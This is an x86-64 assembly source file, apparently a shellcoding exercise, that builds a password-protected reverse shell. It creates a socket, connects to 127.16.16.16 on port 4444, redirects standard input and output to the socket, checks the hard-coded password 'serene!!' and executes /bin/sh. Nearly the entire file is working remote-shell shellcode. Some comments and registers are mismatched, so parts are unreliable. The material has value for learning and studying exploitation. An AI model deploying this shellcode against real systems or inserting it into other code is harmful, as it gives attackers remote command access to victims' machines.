global _start

section .text

_start:
	jmp socket
	hello_world: db 'Enter your password to run your reverseshell',0xA
	password_wrong: db 'Incorrect Password',0xA
	password_correct: db 'You have spawn a shell !',0xA

password_incorrect:

        xor rax, rax                  ; zero out rax
        mov rdx, rax                  ; zero out rdx
        inc rax                       ; write syscall
        mov rdi, rax                  ; move 1 into rdi
        lea rsi, [rel password_wrong] ; moving the address of hello_world variable into rsi which is second parameter

;kali@kali:~/Desktop$ python
;Python 2.7.17 (default, Oct 19 2019, 23:36:22) 
;[GCC 9.2.1 20191008] on linux2
;Type "help", "copyright", "credits" or "license" for more information.
;>>> cmd ='Incorrect Password'
;>>> len(cmd)
;18            

        mov rdx, 19                         ; size of hello_world
        syscall                 ; will prompt the strings 'Password Incorrect'
	jmp password

socket:

;    s = socket(AF_INET, SOCK_STREAM, 0);
;1st param= 2
;2nd param= 1
;3rd param= 0

	xor rax,rax
	mov rax,41
	xor rdi,rdi
	mov rdi,2
	xor rsi,rsi
	mov rsi,1
	xor rdx,rdx
	syscall

	mov rdi,rax

;kali@kali:~/Desktop$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep "connect"
;#define __NR_connect 42
;    connect(s, (struct sockaddr *)&sa, sizeof(sa));


	xor rax,rax
	mov rax,42	; connect syscall
	push 0x1010107f ; ip address of 127.16.16.16
	push word 0x5C11
	push word 2
	mov rsi, rsp

	; rdi have the value of socket descriptor (s)
	
	xor rdx,rdx
	mov dl,0x10 ; length of 16

	syscall

;    dup2(s, 0);
;    dup2(s, 1);
;    dup2(s, 2);


;kali@kali:~/Desktop$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep "dup2"
;#define __NR_dup2 33
	
	xor rax,rax
	mov rax,33
	xor rsi,rsi	
	syscall

	xor rax,rax
	mov rax,33
	inc rsi
	syscall

	xor rax,rax
	mov rax,33
	inc rsi
	syscall


;;;;;;;;;;;;;;;;;;


password:
        ; sys_write
        ; rax : 1
        ; rdi : unsigned int fd : 1 for stdout
        ; rsi : const char *buf : string
        ; rdx : size_t count : how big is the string 

        xor rax, rax                  ; zero out rax
        mov rdx, rax                  ; zero out rdx
        inc rax                       ; write syscall
        mov rdi, rax                  ; move 1 into rdi
        lea rsi, [rel hello_world] ; moving the address of hello_world variable into rsi which is second parameter

;kali@kali:~/Desktop$ python
;Python 2.7.17 (default, Oct 19 2019, 23:36:22) 
;[GCC 9.2.1 20191008] on linux2
;Type "help", "copyright", "credits" or "license" for more information.
;>>> cmd ='Enter your password to run your bindshell'
;>>> len(cmd)
;41                                                                                        
;>>>               

        mov rdi, 45                   ; size of hello_world

        syscall                 ; will prompt the strings 'Enter your password to run your bindshell'

        ; sys_read
        ; rdi : unsigned int fd : 0 for stdin
        ; rsi : char *buf : stack?
        ; rdx : size_t count : how big

        xor rax, rax ; zero out value of rax
        mov rdi, rax ; zero out value of rdi
        mov rdx, rax ; zero out value of rdx

        ; leave rax since read syscall is 0
        mov rsi, rsp    ; set buffer to stack
        add rdx, 8    ; setting size of Password

        syscall ; calling read


;kali@kali:~/Desktop$ python
;Python 2.7.17 (default, Oct 19 2019, 23:36:22) 
;[GCC 9.2.1 20191008] on linux2
;Type "help", "copyright", "credits" or "license" for more information.
;>>> cmd='serene!!'
;>>> cmd
;'serene!!'
;>>> cmd[::-1]
;'!!eneres'
;>>> cmd[::-1].encode('hex')
;'2121656e65726573'
;>>> 2121656e65726573


        mov rdi, rsp                ; setting rdi to input buffer
        mov rax, 0x2121656e65726573 ; moving Password into buffer
        scasq                       ; scanning for a match
        jne password_incorrect           ; if not a match then re-ask for password

;               PROMPT PASSWORD CORRECT

        xor rax, rax                  ; zero out rax
        mov rdx, rax                  ; zero out rdx
        inc rax                       ; write syscall
        mov rdi, rax                  ; move 1 into rdi
        lea rsi, [rel password_correct] ; moving the address of hello_world variable into rsi which is second parameter

;kali@kali:~/Desktop$ python
;Python 2.7.17 (default, Oct 19 2019, 23:36:22) 
;[GCC 9.2.1 20191008] on linux2
;Type "help", "copyright", "credits" or "license" for more information.
;>>> cmd ='You have spawn a shell !'
;>>> len(cmd)
;24

        mov rdx, 25                         ; size of Password_correct
        syscall                 ; will prompt the strings 'System is listening on port 4444 .......'



;;;;;;;;;;;;;;;;;;;


	xor rax,rax
	mov rax,59

	xor rdi,rdi
	push rdi	; null terminator
	mov rdi,0x68732f2f6e69622f ; /bin/sh
	push rdi
	xor rdi,rdi
	mov rdi,rsp

	xor rdx,rdx
	push rdx
	mov rdx,rsp

	push rdi
	mov rsi,rsp
	syscall

